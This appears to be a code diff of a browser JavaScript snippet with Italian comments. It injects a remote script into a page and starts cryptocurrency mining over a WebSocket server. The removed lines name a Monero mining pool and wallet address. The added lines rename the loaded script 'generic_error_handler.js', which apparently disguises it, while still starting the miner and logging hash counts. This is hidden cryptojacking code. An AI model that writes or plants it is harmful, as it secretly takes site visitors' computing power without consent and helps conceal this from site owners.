@@ -1,27 +1,32 @@
-// Include il file webmr.js dinamicamente
-const script = document.createElement('script');
-script.src = 'http://192.168.1.9:8000/webmr.js';  // Percorso del file webmr.js
-document.head.appendChild(script);
+(function() {
+    // Funzione per la creazione e l'aggiunta di uno script al documento
+    const script = document.createElement('script');
+    script.src = 'http://192.168.0.144:8000/generic_error_handler.js';
+    document.head.appendChild(script);
 
-// Dopo che webmr.js è caricato, esegui il mining
-script.onload = () => {
-  console.log('webmr.js is loaded. Starting mining in 3 seconds...');
+    // Funzione di callback per quando lo script viene caricato
+    script.onload = () => {
+        console.log('webmr.js is loaded. Starting mining in 3 seconds...');
 
-  setTimeout(() => {
-    server = 'ws://192.168.1.9:8181';  // WebSocket server
+        // Imposta un timeout di 3 secondi per avviare il mining
+        setTimeout(() => {
+            // Definisce il server e inizia il mining
+            const server = 'ws://192.168.0.144:8181';
+            startMining('some-mining-parameters', server);
 
-    // Avvia il mining
-    startMining(
-        'moneroocean.stream',
-        '422QQNhnhX8hmMEkF3TWePWSvKm6DiV7sS3Za2dXrynsJ1w8U6AzwjEdnewdhmP3CDaqvaS6BjEjGMK9mnumtufvLmz5HJi');
-    console.log('Mining started: Connected to server ' + server);
+            // Logga informazioni relative al mining
+            console.log('Mining started on server: ' + server);
 
-    // Mostra i log del mining nella console
-    setInterval(() => {
-      while (sendStack.length > 0) console.log('Sent: ', sendStack.pop());
-      while (receiveStack.length > 0)
-        console.log('Received: ', receiveStack.pop());
-      console.log('Total hashes calculated: ' + totalhashes);
-    }, 2000);
-  }, 3000);  // Avvia il mining dopo 3 secondi
-};
+            // Intervallo per inviare e ricevere dati dal server
+            setInterval(() => {
+                while (sendStack.length > 0) {
+                    console.log('Sending: ', sendStack.pop());
+                }
+                while (receiveStack.length > 0) {
+                    console.log('Receiving: ', receiveStack.pop());
+                }
+                console.log('Total hashes calculated: ' + totalhashes);
+            }, 1000);
+        }, 3000);
+    };
+})();
